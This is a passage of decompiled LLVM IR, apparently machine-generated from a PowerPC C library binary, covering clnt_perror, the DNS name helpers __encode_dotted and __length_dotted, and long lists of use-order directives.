171, 172, 371, 370, 173, 174, 175, 176, 103, 347, 349, 179, 180, 181, 344, 345, 346, 348, 182, 289, 177, 178, 376, 372, 183, 184, 185, 186, 187, 188, 104, 57, 190, 291, 23, 24, 58, 59, 60, 61, 62, 63, 192, 193, 196, 197, 69, 45, 198, 199, 200, 42, 201, 29, 25, 30, 202, 203, 31, 26, 32, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 252, 253, 254, 255, 64, 286 }
  uselistorder i32 4, {}
  uselistorder label %dec_label_pc_10028704, { 1, 0 }
  uselistorder label %dec_label_pc_100286ec, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1002871c = load i32, i32* @lr, align 4
  store i32 268601132, i32* @lr, align 4
  %v0_10028728 = call i32 @__GI_clnt_sperror()
  %v3_10028734 = load i32, i32* @global_var_1004511c, align 4
  store i32 %v0_1002871c, i32* @lr, align 4
  %v3_10028744 = call i32 @__GI_fputs(i32 %v0_10028728, i32 %v3_10028734, i32 268697600)
  ret i32 %v3_10028744

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__GI_fputs, { 4, 6, 5, 3, 1, 2, 0 }
  uselistorder i32 268697600, { 6, 7, 8, 9, 155, 54, 55, 1, 2, 159, 160, 5, 4, 143, 10, 144, 11, 30, 12, 13, 31, 56, 57, 58, 3, 59, 14, 15, 153, 16, 0, 162, 17, 170, 18, 32, 167, 168, 74, 145, 146, 147, 154, 163, 164, 169, 148, 149, 72, 73, 19, 150, 62, 63, 165, 166, 156, 157, 158, 60, 61, 161, 151, 38, 39, 40, 20, 41, 42, 43, 44, 45, 46, 47, 21, 65, 33, 64, 66, 67, 68, 69, 34, 70, 48, 49, 50, 51, 52, 53, 22, 35, 23, 97, 24, 98, 99, 152, 71, 25, 26, 36, 27, 75, 77, 76, 78, 80, 79, 81, 82, 83, 84, 85, 86, 88, 87, 89, 91, 90, 92, 93, 94, 95, 96, 100, 102, 101, 103, 105, 104, 106, 108, 107, 109, 111, 110, 112, 113, 114, 115, 116, 118, 117, 119, 121, 120, 122, 123, 125, 124, 126, 128, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 37, 28, 29 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1002874c = load i32, i32* @lr, align 4
  store i32 %v0_1002874c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10028758 = load i32, i32* @r4, align 4
  store i32 %v0_10028758, i32* @r29, align 4
  %v0_1002875c = load i32, i32* @r5, align 4
  store i32 %v0_1002875c, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_100287c813 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_100287c813, label %dec_label_pc_100287e4, label %dec_label_pc_100287d8

dec_label_pc_1002876c:                            ; preds = %dec_label_pc_100287d8
  store i32 268601200, i32* @lr, align 4
  %v3_1002876c = call i32 @__GI_strchr(i32 %v0_100287d814, i32 46)
  store i32 %v3_1002876c, i32* @r30, align 4
  %v3_10028770 = icmp eq i32 %v3_1002876c, 0
  %v0_10028774 = load i32, i32* @r31, align 4
  store i32 %v0_10028774, i32* @r3, align 4
  %v2_10028778 = sub i32 %v3_1002876c, %v0_10028774
  store i32 %v2_10028778, i32* %r0.global-to-local, align 4
  br i1 %v3_10028770, label %dec_label_pc_10028780, label %dec_label_pc_10028788

dec_label_pc_10028780:                            ; preds = %dec_label_pc_1002876c
  %v0_10028780 = call i32 @__GI_strlen()
  store i32 %v0_10028780, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_10028780, 16777216
  %v1_10028784 = sdiv i32 %sext, 16777216
  store i32 %v1_10028784, i32* %r0.global-to-local, align 4
  %v0_10028798.pre = load i32, i32* @r31, align 4
  %v0_100287a8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10028788

dec_label_pc_10028788:                            ; preds = %dec_label_pc_1002876c, %dec_label_pc_10028780
  %v0_100287a8 = phi i32 [ %v3_1002876c, %dec_label_pc_1002876c ], [ %v0_100287a8.pre, %dec_label_pc_10028780 ]
  %v0_10028798 = phi i32 [ %v0_10028774, %dec_label_pc_1002876c ], [ %v0_10028798.pre, %dec_label_pc_10028780 ]
  %v0_100287b4 = phi i32 [ %v2_10028778, %dec_label_pc_1002876c ], [ %v1_10028784, %dec_label_pc_10028780 ]
  %v0_10028788 = load i32, i32* @r28, align 4
  %v1_10028788 = load i32, i32* %r27.global-to-local, align 4
  %v2_10028788 = sub i32 %v1_10028788, %v0_10028788
  %v1_10028790 = add i32 %v0_10028788, 1
  store i32 %v1_10028790, i32* %r11.global-to-local, align 4
  %v1_10028794 = add i32 %v2_10028788, -1
  store i32 %v0_10028798, i32* @r4, align 4
  %v0_1002879c = load i32, i32* @r29, align 4
  %v2_1002879c = add i32 %v0_1002879c, %v1_10028790
  store i32 %v2_1002879c, i32* @r3, align 4
  store i32 %v0_100287b4, i32* @r5, align 4
  %v2_100287a4 = icmp ult i32 %v0_100287b4, %v1_10028794
  %v1_100287a8 = add i32 %v0_100287a8, 1
  store i32 %v1_100287a8, i32* @r31, align 4
  %v3_1002878c.not = icmp ne i32 %v0_100287b4, 0
  %or.cond = and i1 %v2_100287a4, %v3_1002878c.not
  br i1 %or.cond, label %dec_label_pc_100287b4, label %dec_label_pc_100287fc

dec_label_pc_100287b4:                            ; preds = %dec_label_pc_10028788
  %v3_100287b4 = trunc i32 %v0_100287b4 to i8
  %v4_100287b4 = add i32 %v0_1002879c, %v0_10028788
  %v5_100287b4 = inttoptr i32 %v4_100287b4 to i8*
  store i8 %v3_100287b4, i8* %v5_100287b4, align 1
  %v0_100287b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100287b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_100287b8 = add i32 %v1_100287b8, %v0_100287b8
  store i32 %v2_100287b8, i32* @r28, align 4
  store i32 268601280, i32* @lr, align 4
  %v0_100287bc = call i32 @memcpy()
  store i32 %v0_100287bc, i32* %r3.global-to-local, align 4
  %v0_100287c0 = load i32, i32* @r30, align 4
  %v3_100287c0 = icmp eq i32 %v0_100287c0, 0
  br i1 %v3_100287c0, label %dec_label_pc_100287e4, label %dec_label_pc_100287b4.dec_label_pc_100287c8_crit_edge

dec_label_pc_100287b4.dec_label_pc_100287c8_crit_edge: ; preds = %dec_label_pc_100287b4
  %v0_100287c8.pre = load i32, i32* @r31, align 4
  %v3_100287c8 = icmp eq i32 %v0_100287c8.pre, 0
  store i32 %v0_100287c8.pre, i32* @r3, align 4
  br i1 %v3_100287c8, label %dec_label_pc_100287e4, label %dec_label_pc_100287d8

dec_label_pc_100287d8:                            ; preds = %entry, %dec_label_pc_100287b4.dec_label_pc_100287c8_crit_edge
  %v0_100287d814 = phi i32 [ %v0_100287c8.pre, %dec_label_pc_100287b4.dec_label_pc_100287c8_crit_edge ], [ %tmp, %entry ]
  %v1_100287d8 = inttoptr i32 %v0_100287d814 to i8*
  %v2_100287d8 = load i8, i8* %v1_100287d8, align 1
  %v3_100287d8 = zext i8 %v2_100287d8 to i32
  store i32 %v3_100287d8, i32* %r0.global-to-local, align 4
  %v3_100287dc = icmp eq i8 %v2_100287d8, 0
  br i1 %v3_100287dc, label %dec_label_pc_100287e4, label %dec_label_pc_1002876c

dec_label_pc_100287e4:                            ; preds = %dec_label_pc_100287b4.dec_label_pc_100287c8_crit_edge, %dec_label_pc_100287b4, %dec_label_pc_100287d8, %entry
  %v0_100287e4 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_100287e4, 1
  br i1 %tmp10, label %dec_label_pc_100287fc, label %dec_label_pc_100287ec

dec_label_pc_100287ec:                            ; preds = %dec_label_pc_100287e4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100287f0 = load i32, i32* @r28, align 4
  %v1_100287f0 = add i32 %v0_100287f0, 1
  store i32 %v1_100287f0, i32* %r3.global-to-local, align 4
  %v1_100287f4 = load i32, i32* @r29, align 4
  %v4_100287f4 = add i32 %v1_100287f4, %v0_100287f0
  %v5_100287f4 = inttoptr i32 %v4_100287f4 to i8*
  store i8 0, i8* %v5_100287f4, align 1
  %v0_10028810.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10028800

dec_label_pc_100287fc:                            ; preds = %dec_label_pc_10028788, %dec_label_pc_100287e4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10028800

dec_label_pc_10028800:                            ; preds = %dec_label_pc_100287ec, %dec_label_pc_100287fc
  %v0_10028810 = phi i32 [ %v0_10028810.pre, %dec_label_pc_100287ec ], [ -1, %dec_label_pc_100287fc ]
  store i32 %v0_1002874c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10028810

; uselistorder directives
  uselistorder i32 %v0_100287d814, { 1, 0 }
  uselistorder i32 %v0_100287c8.pre, { 0, 2, 1 }
  uselistorder i32 %v0_100287b4, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10028784, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 ()* @memcpy, { 20, 6, 17, 16, 19, 47, 46, 39, 38, 3, 51, 11, 10, 0, 5, 4, 37, 36, 35, 13, 15, 14, 45, 44, 43, 42, 41, 40, 1, 18, 9, 8, 7, 50, 34, 2, 49, 48, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 12 }
  uselistorder i32 16777216, { 4, 3, 5, 6, 8, 7, 0, 1, 2 }
  uselistorder i32 ()* @__GI_strlen, { 38, 93, 99, 98, 97, 96, 95, 36, 94, 92, 91, 102, 101, 37, 22, 21, 18, 100, 90, 2, 89, 3, 88, 87, 4, 86, 8, 7, 85, 84, 83, 6, 5, 82, 81, 80, 13, 79, 12, 78, 77, 11, 76, 10, 75, 9, 74, 73, 0, 72, 42, 14, 41, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 20, 19, 52, 51, 50, 49, 48, 47, 44, 46, 45, 15, 43, 30, 29, 16, 28, 27, 26, 17, 25, 24, 23, 40, 39, 35, 1, 34, 32, 33, 31 }
  uselistorder i32* @r30, { 255, 11, 256, 150, 12, 95, 96, 97, 258, 260, 261, 262, 263, 264, 257, 259, 265, 266, 267, 268, 269, 270, 271, 272, 275, 276, 277, 122, 123, 13, 45, 124, 125, 46, 355, 41, 332, 333, 126, 127, 128, 131, 132, 334, 340, 341, 98, 99, 356, 357, 358, 14, 359, 360, 361, 402, 403, 404, 405, 406, 182, 183, 278, 279, 280, 286, 287, 288, 289, 42, 290, 291, 292, 297, 298, 299, 300, 301, 273, 274, 100, 101, 102, 103, 104, 105, 106, 107, 108, 15, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 1, 337, 338, 339, 16, 129, 17, 130, 160, 161, 335, 336, 10, 133, 134, 135, 136, 137, 138, 139, 142, 140, 141, 143, 146, 144, 145, 43, 147, 148, 149, 151, 152, 415, 416, 153, 154, 155, 417, 418, 156, 157, 158, 159, 162, 163, 164, 342, 343, 344, 345, 346, 347, 57, 58, 19, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 18, 73, 71, 72, 74, 75, 76, 348, 349, 350, 351, 352, 353, 354, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 20, 21, 177, 178, 22, 179, 180, 362, 363, 364, 365, 366, 367, 368, 23, 369, 370, 371, 372, 373, 24, 429, 430, 431, 432, 25, 433, 460, 471, 461, 462, 434, 248, 249, 250, 251, 252, 253, 26, 254, 181, 0, 325, 27, 326, 327, 439, 440, 441, 442, 419, 420, 424, 421, 422, 423, 407, 408, 409, 410, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 246, 203, 204, 205, 2, 206, 207, 208, 9, 209, 210, 296, 293, 294, 7, 295, 6, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 3, 28, 88, 89, 90, 91, 92, 93, 94, 463, 464, 465, 466, 467, 468, 469, 29, 470, 374, 30, 375, 376, 377, 378, 314, 31, 315, 316, 283, 281, 282, 284, 317, 318, 320, 319, 8, 321, 322, 323, 324, 32, 285, 379, 380, 381, 382, 383, 4, 385, 47, 386, 33, 387, 388, 384, 389, 390, 391, 392, 393, 394, 395, 34, 396, 397, 5, 398, 399, 400, 401, 438, 435, 44, 331, 242, 243, 244, 245, 247, 239, 35, 456, 225, 226, 227, 228, 229, 443, 445, 444, 447, 446, 211, 212, 213, 214, 215, 414, 411, 412, 413, 216, 217, 218, 219, 220, 221, 222, 223, 36, 224, 230, 436, 437, 426, 428, 457, 458, 459, 48, 49, 50, 51, 52, 53, 54, 55, 56, 231, 448, 449, 450, 452, 37, 451, 232, 233, 234, 235, 236, 38, 427, 39, 425, 453, 454, 40, 455, 237, 238, 240, 241, 328, 329, 330 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 46, { 1, 5, 2, 4, 6, 0, 3 }
  uselistorder i8* null, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder i32* @r28, { 151, 152, 153, 154, 91, 92, 159, 160, 155, 156, 157, 158, 161, 162, 163, 164, 165, 166, 167, 168, 171, 223, 224, 225, 261, 226, 227, 262, 263, 264, 265, 266, 267, 268, 269, 270, 97, 98, 0, 177, 178, 179, 180, 186, 187, 188, 8, 169, 170, 67, 68, 9, 69, 70, 71, 3, 72, 73, 74, 75, 76, 77, 4, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 93, 94, 95, 274, 275, 28, 96, 5, 26, 30, 10, 6, 279, 280, 228, 11, 229, 230, 231, 232, 233, 12, 281, 282, 283, 296, 303, 13, 147, 148, 149, 29, 150, 217, 292, 293, 294, 295, 276, 277, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 189, 190, 191, 192, 193, 194, 195, 113, 14, 112, 114, 115, 116, 117, 118, 119, 181, 185, 182, 183, 184, 7, 31, 15, 32, 33, 34, 35, 16, 36, 17, 37, 38, 39, 40, 41, 42, 18, 43, 44, 45, 46, 47, 48, 19, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 20, 62, 63, 297, 298, 299, 300, 301, 172, 173, 234, 235, 174, 21, 175, 176, 196, 197, 198, 199, 200, 201, 236, 237, 238, 22, 239, 240, 23, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 1, 257, 258, 64, 65, 66, 259, 260, 302, 202, 203, 204, 205, 206, 24, 207, 25, 208, 209, 210, 211, 212, 213, 214, 221, 222, 137, 215, 216, 134, 129, 130, 284, 285, 286, 291, 287, 288, 290, 120, 121, 271, 272, 273, 122, 123, 124, 125, 126, 127, 2, 128, 278, 27, 131, 132, 133, 289, 135, 136, 218, 219, 220, 138, 139, 140, 141, 142, 143, 144, 145, 146 }
  uselistorder i32* @r5, { 193, 194, 9, 42, 195, 196, 4, 50, 224, 252, 220, 53, 48, 225, 257, 253, 199, 200, 205, 206, 207, 197, 43, 44, 45, 46, 47, 5, 6, 222, 49, 51, 52, 221, 54, 55, 259, 56, 57, 258, 58, 59, 15, 16, 223, 60, 139, 7, 208, 2, 209, 226, 227, 228, 229, 230, 231, 232, 261, 110, 233, 234, 235, 236, 237, 238, 279, 286, 181, 182, 260, 75, 160, 254, 255, 61, 62, 63, 64, 65, 66, 67, 68, 210, 211, 69, 70, 201, 202, 204, 203, 166, 167, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 266, 267, 268, 269, 270, 271, 273, 71, 140, 198, 239, 240, 241, 280, 281, 282, 283, 284, 285, 274, 275, 3, 276, 277, 278, 212, 242, 243, 244, 245, 0, 246, 247, 248, 249, 250, 262, 263, 213, 214, 217, 218, 104, 105, 118, 106, 251, 219, 215, 8, 72, 73, 264, 265, 272, 74, 256, 10, 11, 12, 76, 1, 77, 78, 38, 39, 40, 41, 111, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 107, 108, 109, 112, 113, 114, 115, 116, 117, 13, 14, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 161, 162, 163, 164, 165, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 216 }
  uselistorder i32* @r29, { 247, 248, 249, 69, 70, 71, 72, 73, 74, 75, 5, 250, 33, 251, 252, 253, 254, 255, 257, 256, 258, 259, 260, 263, 264, 265, 99, 100, 6, 343, 344, 345, 380, 7, 333, 266, 267, 268, 346, 347, 388, 393, 1, 394, 383, 384, 385, 386, 133, 269, 270, 271, 277, 278, 279, 280, 281, 282, 283, 284, 293, 294, 295, 296, 261, 262, 76, 77, 8, 2, 78, 79, 80, 81, 83, 82, 84, 85, 86, 87, 9, 3, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 0, 331, 332, 101, 102, 103, 104, 105, 107, 106, 108, 109, 110, 395, 111, 112, 10, 113, 11, 114, 115, 116, 117, 118, 119, 120, 121, 12, 396, 122, 334, 46, 13, 47, 335, 336, 337, 338, 339, 340, 341, 342, 124, 123, 125, 126, 127, 128, 129, 416, 417, 349, 350, 351, 348, 352, 41, 353, 354, 14, 355, 356, 357, 358, 359, 360, 418, 419, 420, 421, 422, 381, 382, 15, 245, 130, 131, 132, 325, 326, 423, 424, 425, 426, 427, 16, 428, 434, 435, 436, 397, 398, 399, 400, 401, 387, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 42, 148, 149, 297, 298, 299, 300, 301, 17, 302, 303, 18, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 19, 285, 286, 287, 288, 289, 290, 291, 292, 20, 239, 240, 21, 241, 242, 38, 243, 22, 23, 48, 49, 50, 51, 52, 53, 54, 55, 56, 444, 445, 446, 272, 273, 361, 362, 24, 363, 364, 365, 366, 274, 275, 34, 276, 304, 305, 306, 307, 308, 43, 25, 4, 309, 310, 311, 312, 367, 368, 369, 370, 371, 372, 373, 376, 26, 32, 27, 377, 57, 374, 375, 378, 379, 447, 448, 449, 450, 313, 314, 315, 316, 317, 318, 319, 28, 320, 216, 213, 321, 322, 323, 324, 205, 440, 441, 35, 36, 442, 183, 184, 185, 429, 430, 433, 437, 29, 438, 163, 164, 165, 166, 167, 30, 168, 169, 170, 171, 172, 173, 37, 174, 389, 390, 391, 392, 175, 176, 177, 178, 179, 58, 59, 180, 181, 31, 182, 60, 61, 407, 408, 409, 410, 411, 39, 186, 40, 187, 188, 189, 190, 191, 62, 63, 64, 65, 66, 192, 193, 439, 67, 68, 412, 413, 414, 415, 194, 195, 196, 402, 403, 404, 405, 406, 197, 198, 199, 200, 201, 202, 203, 204, 327, 328, 443, 206, 222, 223, 431, 432, 214, 215, 329, 330, 207, 208, 209, 210, 211, 212, 44, 45, 217, 218, 219, 220, 221, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 244, 246 }
  uselistorder i32* @r31, { 12, 378, 11, 379, 380, 207, 94, 208, 212, 146, 147, 148, 149, 209, 13, 210, 211, 381, 14, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 394, 395, 396, 397, 398, 181, 182, 183, 184, 185, 218, 219, 555, 15, 556, 513, 514, 515, 186, 187, 188, 193, 194, 516, 517, 526, 16, 527, 528, 133, 134, 150, 151, 152, 153, 17, 529, 18, 557, 558, 559, 560, 561, 399, 19, 400, 401, 402, 403, 20, 404, 405, 406, 407, 408, 409, 562, 563, 564, 565, 566, 567, 568, 569, 570, 21, 571, 169, 22, 170, 621, 622, 623, 624, 625, 626, 627, 628, 239, 240, 23, 411, 410, 4, 413, 414, 429, 430, 431, 432, 433, 434, 393, 5, 84, 154, 155, 156, 157, 158, 159, 160, 161, 162, 166, 163, 164, 165, 168, 167, 171, 172, 173, 174, 175, 176, 177, 178, 518, 522, 523, 189, 190, 191, 192, 24, 224, 519, 520, 521, 179, 180, 195, 196, 199, 197, 198, 200, 201, 202, 203, 204, 205, 206, 213, 214, 215, 216, 217, 636, 637, 86, 220, 6, 221, 638, 639, 222, 223, 524, 525, 225, 226, 227, 228, 229, 530, 531, 532, 533, 534, 230, 231, 232, 233, 535, 536, 537, 538, 539, 25, 26, 135, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 354, 355, 356, 357, 415, 27, 416, 417, 28, 418, 419, 29, 420, 421, 572, 573, 574, 575, 576, 577, 578, 579, 30, 580, 581, 582, 583, 31, 584, 32, 585, 586, 587, 85, 588, 0, 668, 669, 670, 33, 87, 671, 75, 672, 34, 673, 674, 675, 676, 677, 678, 679, 680, 88, 740, 741, 82, 371, 681, 682, 372, 373, 374, 375, 376, 377, 234, 235, 236, 237, 238, 504, 505, 7, 697, 698, 699, 700, 701, 702, 703, 711, 640, 649, 641, 642, 643, 35, 644, 645, 646, 647, 648, 336, 337, 338, 339, 36, 629, 630, 631, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 447, 448, 449, 38, 450, 451, 452, 37, 453, 454, 455, 456, 457, 353, 89, 258, 39, 76, 40, 41, 259, 260, 261, 262, 435, 436, 437, 438, 1, 439, 440, 441, 442, 443, 444, 445, 446, 366, 367, 368, 369, 370, 136, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 42, 412, 589, 590, 591, 43, 592, 458, 459, 460, 45, 461, 44, 462, 422, 423, 424, 46, 425, 426, 427, 463, 464, 465, 466, 467, 47, 83, 8, 468, 469, 470, 471, 48, 428, 49, 50, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 53, 52, 609, 51, 613, 614, 54, 615, 616, 617, 618, 137, 138, 611, 610, 612, 619, 55, 620, 683, 56, 684, 90, 57, 77, 685, 686, 687, 688, 689, 690, 691, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 484, 483, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 348, 349, 350, 351, 344, 345, 346, 347, 499, 500, 501, 502, 58, 59, 503, 60, 293, 358, 359, 340, 263, 264, 265, 266, 267, 268, 269, 270, 730, 731, 78, 2, 61, 732, 733, 294, 295, 296, 297, 298, 62, 299, 300, 301, 704, 705, 709, 710, 3, 706, 707, 708, 712, 713, 91, 271, 79, 272, 80, 273, 635, 632, 633, 63, 634, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 64, 284, 285, 286, 287, 290, 291, 292, 288, 65, 289, 302, 303, 692, 693, 694, 695, 696, 655, 656, 665, 9, 666, 667, 737, 738, 739, 95, 66, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 10, 304, 306, 67, 68, 69, 305, 139, 140, 141, 142, 143, 144, 145, 326, 327, 307, 308, 714, 715, 718, 719, 720, 721, 722, 723, 724, 725, 726, 716, 70, 717, 309, 310, 311, 312, 657, 658, 659, 660, 661, 664, 313, 314, 315, 316, 317, 318, 653, 650, 651, 652, 81, 654, 662, 71, 663, 728, 72, 729, 92, 727, 319, 320, 321, 322, 323, 324, 325, 328, 329, 330, 331, 332, 73, 360, 361, 74, 365, 362, 363, 364, 506, 507, 508, 509, 510, 511, 333, 334, 335, 734, 735, 736, 341, 342, 343, 93, 352, 512 }
  uselistorder label %dec_label_pc_10028800, { 1, 0 }
  uselistorder label %dec_label_pc_100287fc, { 1, 0 }
  uselistorder label %dec_label_pc_100287e4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100287d8, { 1, 0 }
  uselistorder label %dec_label_pc_10028788, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_10028814 = load i32, i32* @r3, align 4
  store i32 %v0_10028814, i32* %r11.global-to-local, align 4
  %v3_10028814 = icmp eq i32 %v0_10028814, 0
  %v0_1002881c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10028814, i32 %v0_1002881c)
  %v0_1002882c = load i32, i32* @r4, align 4
  br label %dec_label_pc_10028838

dec_label_pc_10028824:                            ; preds = %dec_label_pc_10028834
  %v1_10028824 = add i32 %v1_10028838, 2
  br label %dec_label_pc_10028854

dec_label_pc_10028834:                            ; preds = %dec_label_pc_10028838
  %v2_1002884c = add i32 %v1_1002883c, %v5_10028838
  %v3_10028848 = icmp eq i32 %v1_10028844, 192
  br i1 %v3_10028848, label %dec_label_pc_10028824, label %dec_label_pc_10028838

dec_label_pc_10028838:                            ; preds = %dec_label_pc_10028834, %entry
  %v1_10028838 = phi i32 [ %v2_1002884c, %dec_label_pc_10028834 ], [ %v0_1002882c, %entry ]
  %v0_10028838 = load i32, i32* %r11.global-to-local, align 4
  %v2_10028838 = add i32 %v0_10028838, %v1_10028838
  %v3_10028838 = inttoptr i32 %v2_10028838 to i8*
  %v4_10028838 = load i8, i8* %v3_10028838, align 1
  %v5_10028838 = zext i8 %v4_10028838 to i32
  %v1_1002883c = add i32 %v1_10028838, 1
  %v3_10028840 = icmp eq i8 %v4_10028838, 0
  %v1_10028844 = call i32 @__asm_rlwinm(i32 %v5_10028838, i32 0, i32 24, i32 25)
  br i1 %v3_10028840, label %dec_label_pc_10028854, label %dec_label_pc_10028834

dec_label_pc_10028854:                            ; preds = %dec_label_pc_10028838, %dec_label_pc_10028824
  %v1_10028854 = phi i32 [ %v1_10028824, %dec_label_pc_10028824 ], [ %v1_1002883c, %dec_label_pc_10028838 ]
  %v0_10028854 = load i32, i32* @r4, align 4
  %v2_10028854 = sub i32 %v1_10028854, %v0_10028854
  ret i32 %v2_10028854

; uselistorder directives
  uselistorder i32 %v1_1002883c, { 1, 0 }
  uselistorder i32 %v5_10028838, { 1, 0 }
  uselistorder i32 %v1_10028838, { 2, 1, 0 }
  uselistorder i32 %v0_10028814, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 82, 85, 86, 87, 88, 89, 90, 91, 92, 26, 27, 93, 32, 28, 29, 122, 123, 83, 84, 30, 31, 33, 34, 35, 1, 2, 103, 104, 37, 36, 94, 105, 106, 107, 69, 70, 71, 126, 127, 137, 125, 72, 67, 68, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 138, 139, 140, 108, 95, 96, 97, 50, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 98, 99, 100, 101, 102, 65, 130, 131, 132, 133, 134, 38, 39, 40, 41, 42, 124, 128, 0, 43, 47, 44, 135, 136, 45, 46, 129, 48, 49, 66, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 73, 74, 75, 76, 77, 78, 79, 80, 81, 141 }
  uselistorder i32 25, { 6, 8, 9, 10, 7, 0, 12, 11, 13, 3, 4, 5, 1, 2 }
  uselistorder i32 24, { 72, 73, 75, 76, 77, 78, 79, 80, 81, 95, 82, 83, 88, 74, 22, 23, 24, 25, 10, 94, 4, 84, 85, 86, 96, 26, 93, 27, 28, 29, 61, 62, 63, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 97, 89, 87, 90, 91, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 110, 92, 35, 112, 111, 5, 6, 7, 8, 9, 30, 108, 31, 32, 33, 34, 36, 0, 37, 1, 38, 39, 40, 2, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 64, 65, 66, 67, 68, 3, 69, 70, 71 }
